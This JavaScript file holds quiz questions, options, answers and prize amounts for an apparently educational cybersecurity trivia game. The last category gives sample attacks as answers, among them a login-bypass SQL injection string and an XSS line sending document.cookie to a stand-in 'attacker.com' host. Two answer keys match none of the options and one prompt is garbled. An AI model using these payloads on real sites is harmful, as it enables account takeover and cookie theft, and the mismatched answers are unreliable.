const questions = [
  /* Category 1 Questions */
  {
    prompt: 'Question 1: What is a strong password?',
    options: ['a. A password that is easy to remember',
     'b. A password that contains both uppercase and lowercase letters, numbers, and special characters', 
     'c. A password that is written down on a piece of paper',
     'd. A password that is the same as your username'],
    correctAnswer: 'b. A password that contains both uppercase and lowercase letters, numbers, and special characters',
    cashPrize: 10
  },
  {
    prompt: 'Question 2: What is two-factor authentication?',
    options: ['a. A security mechanism that requires two different passwords to access an account', 'b. A security mechanism that requires a password and a fingerprint to access an account', 'c. A security mechanism that requires two different methods of authentication to access an account', 'd. A security mechanism that requires a password and a secret question to access an account'],
    correctAnswer: 'c. A security mechanism that requires two different methods of authentication to access an account',
    cashPrize: 50
    },
    
    {
    prompt: 'Question 3: What is social engineering?',
    options: ['a. The process of manipulating people to gain confidential information or access to systems', 'b. The process of hacking into a computer system using software tools', 'c. The process of encrypting sensitive data', 'd. The process of securing computer networks'],
    correctAnswer: 'a. The process of manipulating people to gain confidential information or access to systems',
    cashPrize: 100
    },
    
    {
    prompt: 'Question 4: What is a firewall?',
    options: ['a. A device that encrypts data to protect it from unauthorized access', 'b. A device that filters network traffic to block unauthorized access and attacks', 'c. A device that stores and manages cryptographic keys', 'd. A device that scans for and removes malware from network traffic'],
    correctAnswer: 'b. A device that filters network traffic to block unauthorized access and attacks',
    cashPrize: 500
    },
    
    {
    prompt: 'Question 5: What is cyber warfare?',
    options: ['a. The use of computers and networks to conduct military operations', 'b. The use of cyberattacks to disrupt critical infrastructure or damage computer systems', 'c. The use of software tools to detect and respond to cyberattacks', 'd. The use of artificial intelligence to identify and mitigate cyber threats'],
    correctAnswer: 'b. The use of cyberattacks to disrupt critical infrastructure or damage computer systems',
    cashPrize: 1000
    },
  /* Category 2 Questions */
  {
    prompt: 'What is a penetration test?',
    options: ['A test to see how well a system or network can withstand an attack',
     'A test to see how fast a system or network can process data',
      'A test to see how much data a system or network can store',
       'A test to see how many users can access a system or network at once'],
    correctAnswer: 'A test to see how well a system or network can withstand an attack',
    cashPrize: 10
  },
  {
    prompt: 'What is encryption?',
    options: ['The process of changing plain text into code to keep it secure',
     'The process of breaking a code to gain access to data',
      'The process of monitoring all digital activity on a network',
       'The process of identifying security weaknesses in a system or network'],
    correctAnswer: 'The process of changing plain text into code to keep it secure',
    cashPrize: 50
  },
  {
    prompt: 'What is the purpose of a virtual private network (VPN)?',
    options: ['To encrypt all data on a network',
     'To prevent unauthorized access to a network',
      'To monitor all digital activity on a network',
       'To create a secure connection between a user and a network'],
    correctAnswer: 'To create a secure connection between a user and a network',
    cashPrize: 100
  },
  {
    prompt: 'What is a honeypot?',
    options: ['A type of malware that infects a system or network',
     'A security tool used to detect and deflect attacks',
      'A type of DDoS attack that uses many different devices to overwhelm a network',
     'A type of social engineering attack that targets high-level executives'],
    correctAnswer: 'A security tool used to detect and deflect attacks',
    cashPrize: 500
  },
  {
    prompt: 'What is a security policy?',
    options: ['A set of rules and procedures designed to keep a system or network secure',
     'A set of guidelines for users to follow when using a system or network',
      'A type of malware that encrypts a user\'s files until a ransom is paid',
      'A type of DDoS attack that uses many different devices to overwhelm a network'],
    correctAnswer: 'A set of rules and procedures designed to keep a system or network secure',
    cashPrize: 1000
  },
  /* Category 3 Questions */
  {
    prompt: 'What is binary explotation?',
    options: ['Using a vulnerability in order to cause intended or anticipated behaviour in a program', 'Adding a 2 to a series of 0/1\'s', 'Using a vulnerability in order to cause unintended or unanticipated behaviour in a program', 'Using a vulnerability in order to report it to the owner'],
    correctAnswer: 'Using a vulnerability in order to cause unintended or unanticipated behaviour in a program',
    cashPrize: 10
  },
  {
    prompt: 'Which of these helps in preventing attackers from executing custom shell code?',
    options: ['Using For Loops', 'Being told not to do it', 'Creating an SQL Injection', 'NX Bit'],
    correctAnswer: 'NX Bit',
    cashPrize: 50
  },
  {
    prompt: 'What is important to prevent an attacker from utilizing reverse engineering?',
    options: ['Secure the source code of the application', 'Secure user\'s passwords', 'Don\'t ever host your website', 'Don\'t use a CDN'],
    correctAnswer: 'Secure the source code of the application',
    cashPrize: 100
  },
  {
    prompt: 'What service helps in making data hard to access via randomization?',
    options: ['Random Function in C', 'Address Space Layout Randomization', 'Rolling a pair of dice when pushing code', 'A function written to randomize the output from a given input'],
    correctAnswer: 'Address Space Layout Randomization',
    cashPrize: 500
  },
  {
    prompt: 'Which of these helps in preventing "Stack Smashing"?',
    options: ['Saving a backup of the stack', 'Reading data on the stack', 'Popping off the stack', 'Stack Canaries'],
    correctAnswer: 'Yes, by default',
    cashPrize: 1000
  },
  /* Category 4 Questions */
  {
    prompt: 'What is reverse engineering?',
    options: ['Creating a piece of software with vulnerabilites instead of being a secured piece of software', 'Coding a piece of software backwards', 'Taking a piece of software or hardware and analyzing its functions and information flow so that its functionality and behavior can be misunderstood', 'Taking a piece of software or hardware and analyzing its functions and information flow so that its functionality and behavior can be understood'],
    correctAnswer: 'Taking a piece of software or hardware and analyzing its functions and information flow so that its functionality and behavior can be understood',
    cashPrize: 10
  },
  {
    prompt: 'What is an important element to reverse engineering in Cyber Security?',
    options: ['Configuring a firewall', 'Malware Analysis', 'Creating an SQL Injection', 'Setting up your WiFi Router'],
    correctAnswer: 'Malware Analysis',
    cashPrize: 50
  },
  {
    prompt: 'What is important to prevent an attacker from utilizing reverse engineering?',
    options: ['Secure the source code of the application', 'Secure user\'s passwords', 'Don\'t ever host your website', 'Don\'t use a CDN'],
    correctAnswer: 'Secure the source code of the application',
    cashPrize: 100
  },
  {
    prompt: 'Why could reverse engineering be considered "unethical"?',
    options: ['A user could fix further issues that weren\'t known previously', 'A user learns the in/outs of an application', 'A user could creat a malware clone and distribute it', 'A user reverse engineers unethically'],
    correctAnswer: 'A user could creat a malware clone and distribute it',
    cashPrize: 500
  },
  {
    prompt: 'What is the final step in aquiring the machine code for reverse engineering malware?',
    options: ['Aquiring a Hex Dump of the code', 'Retrieving the high level language of the malware\'s code', 'Aquiring the assembly code of the malware', 'Aquiring the brainstoring documents for the malware'],
    correctAnswer: 'Quickly search files for specific items of text',
    cashPrize: 1000
  },
  /* Category 5 Questions */
  {
    prompt: 'How can an attacker bypass the loging system with SQL? SELECT * FROM users WHERE username=\'admin\' AND password=?se of "Alert"',
    options: ['\' OR \'1\'=\'1\'', '\' AND \'1\'=\'1\'', '\' IF \'1\'=\'1\'', '\' ELSE \'1\'=\'1\''],
    correctAnswer: '\' OR \'1\'=\'1\'',
    cashPrize: 10
  },
  {
    prompt: 'A website has a comment section where users can post comments about the products. How can an attacker get the web site visitor\'s cookies?',
    options: ['window.location = "http://attack.com/steal_cookies.php?cookie=" + document.cookie;', 'window.location = "http://attacker.com/steal_cookies.php?cookie="', 'window.location = "http://attacker.com/steal_cookies.php?cookie=" + document.cookie;', 'window.location = document.cookie;'],
    correctAnswer: 'window.location = "http://attacker.com/steal_cookies.php?cookie=" + document.cookie;',
    cashPrize: 50
  },
  {
    prompt: 'Suppose there is a website that has a search feature to search for products. How can an attacker use reflected cross-site scripting (XSS) to attack a victim?',
    options: ['search?q=alert(\'XSS\')', 'search?q=<...>alert(\'XSS\')</...>', 'XSS', 'search?q=<...>\'XSS\'</...>'],
    correctAnswer: 'search?q=<...>alert(\'XSS\')</...>',
    cashPrize: 100
  },
  {
    prompt: 'Suppose there is a website that allows users to upload files. Which option could cause a vulnerability?',
    options: ['malicious.jpg.php', 'malicous.jpg.png', 'malicous.jpg', 'malicous.jpg.example'],
    correctAnswer: 'malicious.jpg.php',
    cashPrize: 500
  },
  {
    prompt: 'Suppose there is a program that takes a user\'s name as input and stores it in a buffer. How can an attacker exploit this program if the buffer is size 10?',
    options: ['CCCCC', 'BBB', 'DDDDDDDDD', 'AAAAAAAAAAA'],
    correctAnswer: 'AAAAAAAAAAA',
    cashPrize: 1000
  }
];

export default questions;